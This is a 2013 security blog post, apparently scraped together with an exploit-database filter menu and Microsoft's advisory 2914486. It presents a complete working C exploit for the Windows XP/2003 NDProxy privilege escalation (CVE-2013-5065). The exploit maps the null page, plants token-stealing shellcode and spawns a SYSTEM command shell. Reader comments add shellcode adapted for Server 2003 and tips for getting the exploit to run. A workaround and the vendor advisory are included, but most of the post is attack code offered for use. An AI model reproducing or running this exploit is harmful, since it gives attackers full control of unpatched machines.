papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from penturalabs.wordpress.com_2990ba8a_20250126_080721.html ===

[Skip to content](#content)
Follow:
[RSS](https://penturalabs.wordpress.com/feed/)

[Pentura Labs's Blog](https://penturalabs.wordpress.com/)

A security research blog at Pentura

* [Home](https://penturalabs.wordpress.com/)
* [About](https://penturalabs.wordpress.com/about/)
* [Downloads](https://penturalabs.wordpress.com/downloads/)

Tags

[2K3](https://penturalabs.wordpress.com/tag/2k3/), [CVE-2013-5065](https://penturalabs.wordpress.com/tag/cve-2013-5065/), [NDProxy](https://penturalabs.wordpress.com/tag/ndproxy/), [Null Page](https://penturalabs.wordpress.com/tag/null-page/), [privilege escalation](https://penturalabs.wordpress.com/tag/privilege-escalation/), [Windows](https://penturalabs.wordpress.com/tag/windows/), [XP](https://penturalabs.wordpress.com/tag/xp/)

# NDProxy Privilege Escalation (CVE-2013-5065)

by [Andy](https://penturalabs.wordpress.com/author/andydavies2013/ "View all posts by Andy") on December 11, 2013

## Introduction

In the last few days everyone is raving about [CVE-2013-5065](http://www.exploit-db.com/exploits/30014 "NDPROXY Local System Exploit CVE-2013-5065"), a new Windows XP/2k3 privilege escalation, well documented by [FireEye](http://www.fireeye.com/blog/technical/cyber-exploits/2013/11/ms-windows-local-privilege-escalation-zero-day-in-the-wild.html "Fireeye"). Googling around, we came across a Twitter message which contained a link to a Chinese vulnerability analysis and PoC for CVE-2013-5065.

Exploit POC:

```
#include "windows.h"
#include "stdio.h"
void main(){
    HANDLE hdev=CreateFile("\\\\.\\NDProxy",GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0 , NULL);
    if hdev==INVALID_HANDLE_VALUE){
        printf("CreateFile Failed: %d/n",GetLastError());
    }
    DWORD InBuf [0x15] = {0};
    DWORD dwRetbytes = 0;
    *(InBuf + 5) = x7030125;
    *(InBuf + 7) = 0x34;
    DeviceIoControl(hdev,0x8fff23cc,InBuf, 0x54, InBuf, 0x24 , &deRetBytes, 0);
    CloseHandle(hdev);
}
```

Due to the fact that the extended instruction pointer is set to 0×00000038 at the time of the crash, this bug can easily be exploited on Windows XP or 2K3, as both of these Operating Systems allow non-privileged users to map the null page within the context of a user process. It is then quite trivial to produce a fully working exploit.

### Vulnerable Systems:

* Windows XP SP3 (x32)
* Windows XP SP2 (x64)
* Windows 2003 SP2 (x32)
* Windows 2003 SP2 (x64)
* Windows 2003  SP2 for Itanium-based Systems

### Workaround

To implement this workaround, please follow the steps below.

I run the following command from the command prompt (as an administrator):

```
sc stop ndproxy
reg add HKLM \ System \ CurrentControlSet \ Services \ ndproxy / v ImagePath / t REG_EXPAND_SZ / d system32 \ drivers \ null.sys / f
```

If you disable NDProxy.Sys, Windowssome services that depend Telephony Application Programming Interfaces of the (TAPI) will not work. As such the following services will fail to function correctly: Remote Access Service (RAS), Dial-Up Networking , Virtual Private Network (VPN).

## Weaponising the Code

The crux of the exploit is there all we need to do is write our shell code to the NULL page; rather than reinvent the wheel I scoured exploit-db for some previous written code.  I found a useful code block ***InitFirstPage()*** in the following exploit for MS10-047 ([http://www.exploit-db.com/exploits/14666/](http://www.exploit-db.com/exploits/14666/ "http://www.exploit-db.com/exploits/14666/")).

Then added the following code at the bottom of the main function:

```
system("start /d \"C:\\windows\\system32\" cmd.exe");
return 0;
```

After some more playing around with the shell code, I decided to take ryujin’s original python code and convert it to C.

From:

`sh="\x90\x33\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x44\x8B\xC8\x8B\x80\x88\x00\x00\x00\x2D\x88\x00\x00\x00\x83\xB8\x84\x00\x00\x00\x04\x75\xEC\x8B\x90\xC8\x00\x00\x00\x89\x91\xC8\x00\x00\x00\xC3"

sc ="\x90"*0x38 + "\x3c\x00\x00\x00" + "\x90"*4 + sh +"\xcc"*(0x400-0x3c-4-len(sh))`

To:

`unsigned char sc[] =

"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

"\x90\x90\x90\x90\x90\x90\x90\x90\x3C\x00\x00\x00\x90\x90\x90\x90"

"\x90\x33\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x44\x8B\xC8\x8B"

"\x80\x88\x00\x00\x00\x2D\x88\x00\x00\x00\x83\xB8\x84\x00\x00\x00"

"\x04\x75\xEC\x8B\x90\xC8\x00\x00\x00\x89\x91\xC8\x00\x00\x00\xC3";

unsigned char * sh;

sh=(char*)malloc(400);

memset(sh,"\xCC",400);

memcpy(sh,sc,112);`

## Exploit

The resulting code looks like:

```
/*
NDProxy.c
NDProxy.sys Local Privilege Escalation Exploit CVE-2013-5065
Based on Chinese PoC with ideas taken from Ryujin's and Tavis Ormandy's previously released exploit code.
Pentura 2013(C)
10-DEC-2013
Tested on Windows XP SP3 32-bit
*/
#include "windows.h"
#include "stdio.h"

typedef struct {
    PVOID   Unknown1;
    PVOID   Unknown2;
    PVOID   Base;
    ULONG   Size;
    ULONG   Flags;
    USHORT  Index;
    USHORT  NameLength;
    USHORT  LoadCount;
    USHORT  PathLength;
    CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct {
    ULONG   Count;
    SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemModuleInformation = 11,
    SystemHandleInformation = 16
} SYSTEM_INFORMATION_CLASS;

typedef DWORD NTSTATUS;
NTSTATUS (WINAPI *_NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass,
         PVOID SystemInformation,
         ULONG SystemInformationLength,
         PULONG ReturnLength
         );

static VOID InitFirstPage()
{
    PVOID BaseAddress;
    ULONG RegionSize;
    NTSTATUS ReturnCode;
    FARPROC NtAllocateVirtualMemory;

    NtAllocateVirtualMemory = GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtAllocateVirtualMemory");

    fprintf(stderr, "NtAllocateVirtualMemory@%p\n", NtAllocateVirtualMemory);
    RegionSize = 0xf000;
    BaseAddress = (PVOID) 0x00000001;
    ReturnCode = NtAllocateVirtualMemory(GetCurrentProcess(),
                                         &BaseAddress,
	                                     0,
                                         &RegionSize,
                                         MEM_COMMIT | MEM_RESERVE,
                                         PAGE_EXECUTE_READWRITE);
     if (ReturnCode != 0) {
         fprintf(stderr, "NtAllocateVirtualMemory() failed to map first page, %#X\n",ReturnCode);
         fflush(stderr);
         ExitProcess(1);
    }
    fprintf(stderr, "BaseAddress: %p, RegionSize: %#x\n", BaseAddress, RegionSize), fflush(stderr);
    FillMemory(BaseAddress, RegionSize, 0x41);
    return;
}

int main()
{
    DWORD fb;
    int result;

    InitFirstPage();

    unsigned char sc[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x3C\x00\x00\x00\x90\x90\x90\x90"
    "\x90\x33\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x44\x8B\xC8\x8B"
    "\x80\x88\x00\x00\x00\x2D\x88\x00\x00\x00\x83\xB8\x84\x00\x00\x00"
    "\x04\x75\xEC\x8B\x90\xC8\x00\x00\x00\x89\x91\xC8\x00\x00\x00\xC3";
    unsigned char * sh;
    sh=(char*)malloc(400);
    memset(sh,"\xCC",400);
    memcpy(sh,sc,112);

    result = WriteProcessMemory((HANDLE)0xFFFFFFFF, (LPVOID)0x00000001, sh, 0x400, &fb);
    if (result==0)
    {
        printf("[!] Error occured while attempting to map memory_write");
        printf("Details : %d\n", GetLastError());
        exit(1);
    }

    HANDLE hdev=CreateFile("\\\\.\\NDProxy",GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0 , NULL);
    if (hdev==INVALID_HANDLE_VALUE){
        printf("CreateFile Failed: %d/n",GetLastError());
    }
    DWORD InBuf [0x15] = {0};
    DWORD dwRetBytes = 0;
    *(InBuf + 5) = 0x7030125;
    *(InBuf + 7) = 0x34;
    DeviceIoControl(hdev,0x8fff23cc,InBuf, 0x54, InBuf, 0x24 , &dwRetBytes, 0);
    CloseHandle(hdev);
    printf("[+] Spawning SYSTEM Shell...");
    system("start /d \"C:\\Windows\\System32\" cmd.exe");
    return 0;
}
```
## Links

* [https://technet.microsoft.com/en-us/security/advisory/2914486](https://technet.microsoft.com/en-us/security/advisory/2914486 "https://technet.microsoft.com/en-us/security/advisory/2914486")
* <http://www.fireeye.com/blog/technical/cyber-exploits/2013/11/ms-windows-local-privilege-escalation-zero-day-in-the-wild.html>
* [http://www.exploit-db.com/exploits/14666/](http://www.exploit-db.com/exploits/14666/ "http://www.exploit-db.com/exploits/14666/")
* [http://msdn.microsoft.com/en-us/library/windows/hardware/ff556440(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/hardware/ff556440%28v%3Dvs.85%29.aspx "http://msdn.microsoft.com/en-us/library/windows/hardware/ff556440(v=vs.85).aspx")

### Rate this:

### Share this:

* Email
* [Facebook](https://penturalabs.wordpress.com/2013/12/11/ndproxy-privilege-escalation-cve-2013-5065/?share=facebook "Click to share on Facebook")
* [Twitter](https://penturalabs.wordpress.com/2013/12/11/ndproxy-privilege-escalation-cve-2013-5065/?share=twitter "Click to share on Twitter")
Like Loading...

From → [exploitation](https://penturalabs.wordpress.com/category/exploitation/), [pentesting](https://penturalabs.wordpress.com/category/pentesting/), [pentura](https://penturalabs.wordpress.com/category/pentura/), [security](https://penturalabs.wordpress.com/category/security/), [virus](https://penturalabs.wordpress.com/category/virus/)

10 Comments

1. ![](https://0.gravatar.com/avatar/9e59d303ed1d960daabf64dba29af05dcb8e8c10b8e01ab0add37832721d61b0?s=40&d=identicon&r=G)
   Pakbug [permalink](https://penturalabs.wordpress.com/2013/12/11/ndproxy-privilege-escalation-cve-2013-5065/#comment-4207)

   Its crashing my win2k3 for some reason..No system level shell..Any clues?

   [Reply](https://penturalabs.wordpress.com/2013/12/11/ndproxy-privilege-escalation-cve-2013-5065/?replytocom=4207#respond)
   * ![](https://1.gravatar.com/avatar/a4d8494ed61355dbeddd3d63015f547c5d43362e6edf025b0ba1ad9ccce53ec4?s=40&d=identicon&r=G)
     [Andy](http://www.pentura.com) [permalink](https://penturalabs.wordpress.com/2013/12/11/ndproxy-privilege-escalation-cve-2013-5065/#comment-4209)

     If you read the small print, “Tested on Win XP SP3!”, I can guarantee it works, and multiple times… though it can crash XP after repeated exploitation (5+ attempts) 😦

     The exploit will work on Win 2K3 SP2, but it will not work with the standard publicly available shellcode (which is XP based). I suggest using a debugger and changing the shell code to one that works for Win2K3.

     The shellcode in use is not your standard cmd.exe shellcode, its a token stealing shellcode: that effectively swaps out our user token with that of system token. Then when we call cmd.exe at the bottom of our exploit – that is why the cmd is running with SYSTEM privileges; it should be trivial to swap out the XP token stealing ring-0 code with a Win2K3 token-stealing ring-0 shellcode.

     [Reply](https://penturalabs.wordpress.com/2013/12/11/ndproxy-privilege-escalation-cve-2013-5065/?replytocom=4209#respond)
     + ![](https://2.gravatar.com/avatar/b957157ecbff353caa045d67895f6dac19337d03bf1226ec1d2a50a7c4aae8dd?s=40&d=identicon&r=G)
       John [permalink](https://penturalabs.wordpress.com/2013/12/11/ndproxy-privilege-escalation-cve-2013-5065/#comment-4502)

       Hi ,

       First of all, thanks for your post. I am investigation the crashing issue on this exploit (for academic reason).

       Do you have any idea why it crashes after repeated exploitation ? I can not come near to an explanation 😥
     + ![](https://1.gravatar.com/avatar/a4d8494ed61355dbeddd3d63015f547c5d43362e6edf025b0ba1ad9ccce53ec4?s=40&d=identicon&r=G)
       [Andy](http://www.pentura.com) [permalink](https://penturalabs.wordpress.com/2013/12/11/ndproxy-privilege-escalation-cve-2013-5065/#comment-4539)

       I actually have not gone further than tracing the initial exploit run. The ring-0 shell code is in simplistic terms token stealing. I think it crashes when multiple attempts of writing into the HalDispatchTable, disrupts/corrupts the table and the location of our shellcode in memory.

       I advise reading:

       > [Introduction to Windows Kernel Exploitation – DVWD.sys](https://l0ca1host.wordpress.com/2013/07/07/introduction-to-windows-kernel-exploitation-dvwd-sys/)
3. ![](https://0.gravatar.com/avatar/c0ee4ae4a8874b0f38b003f4de931012785aa327e00016233690b697d3bd296e?s=40&d=identicon&r=G)
   [James](http://n/a) [permalink](https://penturalabs.wordpress.com/2013/12/11/ndproxy-privilege-escalation-cve-2013-5065/#comment-4210)

   I can confirm it works on XP SP3 🙂

   [Reply](https://penturalabs.wordpress.com/2013/12/11/ndproxy-privilege-escalation-cve-2013-5065/?replytocom=4210#respond)
5. ![](https://i0.wp.com/abs.twimg.com/sticky/default_profile_images/default_profile_6_normal.png?resize=40%2C40&ssl=1)
   [reader crap (@crap\_reader)](http://twitter.com/crap_reader) [permalink](https://penturalabs.wordpress.com/2013/12/11/ndproxy-privilege-escalation-cve-2013-5065/#comment-4314)

   Hi there,

   I tested it on XP SP3 it is working fine and with help of ruby code given in “https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms\_ndproxy.rb” changed the data for windows 2003 SP2 (32 bit) and tested. There also it is working fine.

   Shellcode for 32 bit Windows Server 2003 is :

   unsigned char sc[] =

   “\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90”

   “\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90”

   “\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90”

   “\x90\x90\x90\x90\x90\x90\x90\x90\x3C\x00\x00\x00\x90\x90\x90\x90”

   “\x90\x33\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x38\x8B\xC8\x8B”

   “\x80\x98\x00\x00\x00\x2D\x98\x00\x00\x00\x83\xB8\x94\x00\x00\x00”

   “\x04\x75\xEC\x8B\x90\xD8\x00\x00\x00\x89\x91\xD8\x00\x00\x00\xC3”;

   //this is for Windows Server 2003 SP2.

   One thing i want to know that . Do we need to write a 64 bit shellcode for x64 platform. I think we needed.

   Can someone help me to find the good resource for 64 bit shellcode.

   [Reply](https://penturalabs.wordpress.com/2013/12/11/ndproxy-privilege-escalation-cve-2013-5065/?replytocom=4314#respond)
7. ![](https://0.gravatar.com/avatar/99f1af0c38ad7a438a432a6e8190af7514834022381602bcdea8754093629ba6?s=40&d=identicon&r=G)
   [crapreader](http://crapreader.wordpress.com) [permalink](https://penturalabs.wordpress.com/2013/12/11/ndproxy-privilege-escalation-cve-2013-5065/#comment-4321)

   is this same code will crash on windows XP SP2 x64 system. I am getting file not found error (GetLastError as 2) in createfile of ndproxy

   [Reply](https://penturalabs.wordpress.com/2013/12/11/ndproxy-privilege-escalation-cve-2013-5065/?replytocom=4321#respond)
   * ![](https://1.gravatar.com/avatar/a4d8494ed61355dbeddd3d63015f547c5d43362e6edf025b0ba1ad9ccce53ec4?s=40&d=identicon&r=G)
     [Andy](http://www.pentura.com) [permalink](https://penturalabs.wordpress.com/2013/12/11/ndproxy-privilege-escalation-cve-2013-5065/#comment-4329)

     You probably need to start the RAS service, I think its set to manual or disabled by default on x64

     [Reply](https://penturalabs.wordpress.com/2013/12/11/ndproxy-privilege-escalation-cve-2013-5065/?replytocom=4329#respond)
     + ![](https://i0.wp.com/abs.twimg.com/sticky/default_profile_images/default_profile_6_normal.png?resize=40%2C40&ssl=1)
       [reader crap (@crap\_reader)](http://twitter.com/crap_reader) [permalink](https://penturalabs.wordpress.com/2013/12/11/ndproxy-privilege-escalation-cve-2013-5065/#comment-4332)

       thanks Andy.

       After starting the RAS service “file not found” error has gone.
9. ![](https://2.gravatar.com/avatar/e153391dee0a56d1294898bd45c61399ac8342cece2b999d61d98e23b3dd42f0?s=40&d=identicon&r=G)
   [thanksman](http://none) [permalink](https://penturalabs.wordpress.com/2013/12/11/ndproxy-privilege-escalation-cve-2013-5065/#comment-5971)

   hey what compiler are u using?

   [Reply](https://penturalabs.wordpress.com/2013/12/11/ndproxy-privilege-escalation-cve-2013-5065/?replytocom=5971#respond)

### Leave a comment [Cancel reply](/2013/12/11/ndproxy-privilege-escalation-cve-2013-5065/#respond)

Δ

« [Happy New Year!](https://penturalabs.wordpress.com/2014/01/01/happy-new-year/)
[What is 2G, 3G, 4G?](https://penturalabs.wordpress.com/2013/12/07/what-is-2g-3g-4g/) »

* ## Subscribe to Pentura Labs

  [![](https://i0.wp.com/www.feedburner.com/fb/images/pub/feed-icon32x32.png)](http://feeds.feedburner.com/PenturaLabs "Subscribe to my feed")[Subscribe in a reader](http://feeds.feedburner.com/PenturaLabs "Subscribe to my feed")
* ## Recent Posts

  + [SNMPPLUX](https://penturalabs.wordpress.com/2016/04/01/snmpplux/)
  + [Finding and Exploiting Same Origin Method Execution vulnerabilities](https://penturalabs.wordpress.com/2015/12/30/finding-and-exploiting-same-origin-method-execution-vulnerabilities/)
  + [[IRCCloud] History and Another XSS Bug Bounty](https://penturalabs.wordpress.com/2015/10/14/irccloud-history-and-another-xss-bug-bounty/)
  + [[IRCCloud] Inadequate input validation on API endpoint leading to self denial of service and increased system load](https://penturalabs.wordpress.com/2015/10/13/fuzzing-for-fun-and-profit/)
  + [Most businesses do not understand data breach risks](https://penturalabs.wordpress.com/2014/11/07/most-businesses-do-not-understand-data-breach-risks/)
* ## Categories

  [13.56MHz](https://penturalabs.wordpress.com/tag/13-56mhz/)
  [125kHz](https://penturalabs.wordpress.com/tag/125khz/)
  [Adafruit](https://penturalabs.wordpress.com/tag/adafruit/)
  [Android](https://penturalabs.wordpress.com/tag/android/)
  [apache](https://penturalabs.wordpress.com/tag/apache/)
  [arduino](https://penturalabs.wordpress.com/tag/arduino-2/)
  [Bluetooth](https://penturalabs.wordpress.com/tag/bluetooth/)
  [breach](https://penturalabs.wordpress.com/tag/breach/)
  [clone](https://penturalabs.wordpress.com/tag/clone/)
  [cookies](https://penturalabs.wordpress.com/tag/cookies/)
  [Cross Site Scripting](https://penturalabs.wordpress.com/tag/cross-site-scripting/)
  [data](https://penturalabs.wordpress.com/tag/data/)
  [default files](https://penturalabs.wordpress.com/tag/default-files/)
  [DLP](https://penturalabs.wordpress.com/tag/dlp/)
  [Ducky](https://penturalabs.wordpress.com/tag/ducky/)
  [electronics](https://penturalabs.wordpress.com/tag/electronics-2/)
  [Encryption](https://penturalabs.wordpress.com/tag/encryption/)
  [exploit](https://penturalabs.wordpress.com/tag/exploit/)
  [exploitation](https://penturalabs.wordpress.com/tag/exploitation/)
  [firefox](https://penturalabs.wordpress.com/tag/firefox/)
  [flash](https://penturalabs.wordpress.com/tag/flash/)
  [flex](https://penturalabs.wordpress.com/tag/flex/)
  [fuzzing](https://penturalabs.wordpress.com/tag/fuzzing/)
  [Hak5](https://penturalabs.wordpress.com/tag/hak5/)
  [HF](https://penturalabs.wordpress.com/tag/hf/)
  [HID](https://penturalabs.wordpress.com/tag/hid/)
  [IPad](https://penturalabs.wordpress.com/tag/ipad/)
  [java](https://penturalabs.wordpress.com/tag/java/)
  [javascript](https://penturalabs.wordpress.com/tag/javascript/)
  [LF](https://penturalabs.wordpress.com/tag/lf/)
  [Linux](https://penturalabs.wordpress.com/tag/linux/)
  [metasploit](https://penturalabs.wordpress.com/tag/metasploit/)
  [Microsoft Windows](https://penturalabs.wordpress.com/tag/microsoft-windows/)
  [MIFARE](https://penturalabs.wordpress.com/tag/mifare/)
  [Open Source](https://penturalabs.wordpress.com/tag/open-source/)
  [OpenWrt](https://penturalabs.wordpress.com/tag/openwrt/)
  [opinion](https://penturalabs.wordpress.com/tag/opinion/)
  [pentesting](https://penturalabs.wordpress.com/tag/pentesting/)
  [pentura](https://penturalabs.wordpress.com/tag/pentura/)
  [PHP](https://penturalabs.wordpress.com/tag/php/)
  [Pi](https://penturalabs.wordpress.com/tag/pi/)
  [Pineapple](https://penturalabs.wordpress.com/tag/pineapple/)
  [Pololu](https://penturalabs.wordpress.com/tag/pololu/)
  [privacy](https://penturalabs.wordpress.com/tag/privacy/)
  [privilege escalation](https://penturalabs.wordpress.com/tag/privilege-escalation/)
  [Programming](https://penturalabs.wordpress.com/tag/programming/)
  [proxmark](https://penturalabs.wordpress.com/tag/proxmark/)
  [Proxmark3](https://penturalabs.wordpress.com/tag/proxmark3/)
  [Radio](https://penturalabs.wordpress.com/tag/radio/)
  [Raspberry Pi](https://penturalabs.wordpress.com/tag/raspberry-pi/)
  [rdggeek](https://penturalabs.wordpress.com/tag/rdggeek/)
  [RFID](https://penturalabs.wordpress.com/tag/rfid/)
  [robotics](https://penturalabs.wordpress.com/tag/robotics/)
  [robotics week](https://penturalabs.wordpress.com/tag/robotics-week/)
  [rootedcon](https://penturalabs.wordpress.com/tag/rootedcon/)
  [RTL-SDR](https://penturalabs.wordpress.com/tag/rtl-sdr/)
  [SDR](https://penturalabs.wordpress.com/tag/sdr/)
  [security](https://penturalabs.wordpress.com/tag/security/)
  [server audit](https://penturalabs.wordpress.com/tag/server-audit/)
  [snmp](https://penturalabs.wordpress.com/tag/snmp/)
  [social engineering](https://penturalabs.wordpress.com/tag/social-engineering-2/)
  [ssl](https://penturalabs.wordpress.com/tag/ssl-2/)
  [talks](https://penturalabs.wordpress.com/tag/talks/)
  [Telephony](https://penturalabs.wordpress.com/tag/telephony/)
  [twitter](https://penturalabs.wordpress.com/tag/twitter/)
  [USB](https://penturalabs.wordpress.com/tag/usb/)
  [USB Rubber Ducky](https://penturalabs.wordpress.com/tag/usb-rubber-ducky/)
  [web](https://penturalabs.wordpress.com/tag/web/)
  [web security](https://penturalabs.wordpress.com/tag/web-security/)
  [Wi-Fi](https://penturalabs.wordpress.com/tag/wi-fi/)
  [WiFi](https://penturalabs.wordpress.com/tag/wifi/)
  [Windows](https://penturalabs.wordpress.com/tag/windows/)
  [Windows Security](https://penturalabs.wordpress.com/tag/windows-security/)
  [xss](https://penturalabs.wordpress.com/tag/xss/)
  [Zumo](https://penturalabs.wordpress.com/tag/zumo/)

[Blog at WordPress.com.](https://wordpress.com/?ref=footer_blog)

* [Comment](https://penturalabs.wordpress.com/2013/12/11/ndproxy-privilege-escalation-cve-2013-5065/#comments)
* Reblog
* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Pentura Labs's Blog](https://penturalabs.wordpress.com)

  Join 43 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fpenturalabs.wordpress.com%2F2013%2F12%2F11%2Fndproxy-privilege-escalation-cve-2013-5065%2F&signup_flow=account)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Pentura Labs's Blog](https://penturalabs.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fpenturalabs.wordpress.com%2F2013%2F12%2F11%2Fndproxy-privilege-escalation-cve-2013-5065%2F&signup_flow=account)
  + [Copy shortlink](https://wp.me/p11ywI-p5)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://penturalabs.wordpress.com/2013/12/11/ndproxy-privilege-escalation-cve-2013-5065/)
  + [View post in Reader](https://wordpress.com/read/blogs/15147388/posts/1555)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

%d

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from technet.microsoft.com_3b1e81b1_20250125_105928.html ===

[Skip to main content](#main)

This browser is no longer supported.

Upgrade to Microsoft Edge to take advantage of the latest features, security updates, and technical support.

[Download Microsoft Edge](https://go.microsoft.com/fwlink/p/?LinkID=2092881 )
[More info about Internet Explorer and Microsoft Edge](https://learn.microsoft.com/en-us/lifecycle/faq/internet-explorer-microsoft-edge)

Table of contents

Exit focus mode

Read in English

Save

Table of contentsRead in English

Save

Add to plan
[Edit](https://github.com/MicrosoftDocs/security-updates/blob/live/security-updates/SecurityAdvisories/2014/2914486.md "Edit This Document")

---

#### Share via

Facebook
x.com
LinkedIn
Email

---

Print

Table of contents

* Article
* 10/14/2022
* 3 contributors

Feedback

## In this article

Security Advisory

# Microsoft Security Advisory 2914486

## Vulnerability in Microsoft Windows Kernel Could Allow Elevation of Privilege

Published: November 27, 2013 | Updated: January 14, 2014

**Version:** 2.0

### General Information

#### Executive Summary

Microsoft has completed the investigation into reports of this vulnerability. We have issued [MS14-002](https://go.microsoft.com/fwlink/?linkid=389579) to address the Kernel NDProxy Vulnerability ([CVE-2013-5065](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2013-5065)). For more information about this issue, including download links for an available security update, please review [MS14-002](https://go.microsoft.com/fwlink/?linkid=389579).

### Other Information

#### Acknowledgments

Microsoft [thanks](https://go.microsoft.com/fwlink/?linkid=21127) the following for working with us to help protect customers:

* [FireEye, Inc.](https://www2.fireeye.com/) for helping us with the Kernel NDProxy Vulnerability (CVE-2013-5065)

#### Microsoft Active Protections Program (MAPP)

To improve security protections for customers, Microsoft provides vulnerability information to major security software providers in advance of each monthly security update release. Security software providers can then use this vulnerability information to provide updated protections to customers via their security software or devices, such as antivirus, network-based intrusion detection systems, or host-based intrusion prevention systems. To determine whether active protections are available from security software providers, please visit the active protections websites provided by program partners, listed in [Microsoft Active Protections Program (MAPP) Partners](https://go.microsoft.com/fwlink/?linkid=215201).

#### Feedback

* You can provide feedback by completing the Microsoft Help and Support form, [Customer Service Contact Us](https://support.microsoft.com/kb/?scid=sw;en;1257&showpage=1&ws=technet&sd=tech).

#### Support

* Customers in the United States and Canada can receive technical support from [Security Support](https://go.microsoft.com/fwlink/?linkid=21131). For more information, see [Microsoft Help and Support](https://support.microsoft.com/).
* International customers can receive support from their local Microsoft subsidiaries. For more information, see [International Support](https://go.microsoft.com/fwlink/?linkid=21155).
